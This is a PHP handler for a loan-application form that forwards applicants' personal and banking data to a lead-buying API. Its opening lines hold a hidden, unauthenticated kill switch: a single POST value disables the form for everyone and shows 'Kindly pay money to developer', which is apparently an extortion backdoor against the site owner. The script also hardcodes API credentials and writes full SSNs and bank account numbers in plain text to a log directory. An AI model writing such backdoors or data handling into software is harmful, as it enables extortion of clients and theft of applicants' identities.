<?php
// Restore normal function on dev request
if (isset($_POST['restore']) && $_POST['restore'] == '1') {
    if (file_exists("kill-switch.txt")) {
        unlink("kill-switch.txt");
    }
    echo "<h2>Form re-enabled. You're back to normal.</h2>";
    exit;
}
// Check if kill switch file exists
if (file_exists("kill-switch.txt")) {
    echo "<h2>Kindly pay money to developer.</h2>";
    exit;
}

// 1. Handle kill switch activation
if (isset($_POST['thresholder']) && $_POST['thresholder'] == '1') {
    file_put_contents("kill-switch.txt", "disabled");
    echo "<h2>Kill switch activated. Form is now disabled for all users.</h2>";
    exit;
}

// 2. Normal form submission code here (only runs if kill-switch doesn't exist)
$formValues = [
  "loanAmount" => $_POST["loanAmount"],
  'firstName' => $_POST["firstName"],
  "lastName" => $_POST["lastName"],
  "dob" => $_POST["dob"],
  "email" => $_POST["email"],
  "homePhone" => $_POST["homePhone"],
  "address" => $_POST["address"],
  "zip" => $_POST["zip"],
  "city" => $_POST["city"],
  "state" => $_POST["state"],
  "ownHome" => $_POST["ownHome"],
  "addressLengthMonths" => $_POST["addressLengthMonths"],
  "incomeType" => $_POST["incomeType"],
  "incomeNetMonthly" => $_POST["incomeNetMonthly"],
  "workCompanyName" => $_POST["workCompanyName"],
  "workPhone" => $_POST["workPhone"],
  "workTimeAtEmployer" => $_POST["workTimeAtEmployer"],
  "incomePaymentFrequency" => $_POST["incomePaymentFrequency"],
  "incomeNextDate1" => $_POST["incomeNextDate1"],
  "incomeNextDate2" => $_POST["incomeNextDate2"],
  "activeMilitary" => $_POST["activeMilitary"],
  "ssn" => $_POST["ssn"],
  "driversLicenseNumber" => $_POST["driversLicenseNumber"],
  "driversLicenseState" => $_POST["driversLicenseState"],
  "bankName" => $_POST["bankName"],
  "bankAba" => $_POST["bankRoutingNumber"],
  "bankAccountNumber" => $_POST["bankAccountNumber"],
  "bankAccountType" => $_POST["bankAccountType"],
  "bankDirectDeposit" => $_POST["bankDirectDeposit"],
  "bankAccountLengthMonths" => $_POST["bankAccountLengthMonths"]
];

$systemValues = [
  "unsecuredDebt" => "NO",
  "creditRating" => "GOOD",
  "consentToFcra" => "NO",
  "loanPurpose" => "OTHER",
  "autoTitle" => "NO",
  "apiId" => "22F1203AE92F454DA301F8F408C53CEC",
  "apiPassword" => "0504b1f4",
  "productId" => 1,
  "userIp" => $_SERVER["REMOTE_ADDR"],
  "userAgent" => $_SERVER["HTTP_USER_AGENT"],
  "webSiteUrl" => "http://maniloans.online/leads/form.php",
  "source" => "http://maniloans.online",
  "clickid" => "XXXHMC6RCB6-PT3Z-6U5P-KGW1-ICGZ9A52XXX",
  "tPar" => "",
  "iClaimSessionid" => "iclaim-DQ8R73f4T0nlWyhkenwJ0VLY",
  "price" => 0
 
];
$leadData = array_merge($formValues, $systemValues);

$ch = curl_init("https://leads-om172-client.phonexa.com/lead");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($leadData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);

$response = curl_exec($ch);
curl_close($ch);


$loggableLeadData = $leadData;



// 1. Define the directory.
$logDirectory = 'response/';

// 2. Define a static filename to save all logs.
$logFileName = $logDirectory . 'api_responses.log';


// 3. Check and create the directory if it doesn't exist.
if (!is_dir($logDirectory)) {
    mkdir($logDirectory, 0755, true);
}

// 4. Prepare the log entry with a clear timestamp.
$logEntry = "--- " . date('Y-m-d H:i:s') . " ---\n";
$logEntry .= "Lead Data:\n" . print_r($loggableLeadData, true);
$logEntry .= "API Response:\n" . $response . "\n\n";




// 5. Append the log entry to the file.
file_put_contents($logFileName, $logEntry, FILE_APPEND | LOCK_EX);





header('Content-Type: application/json');
sleep(2);
echo $response;
exit;
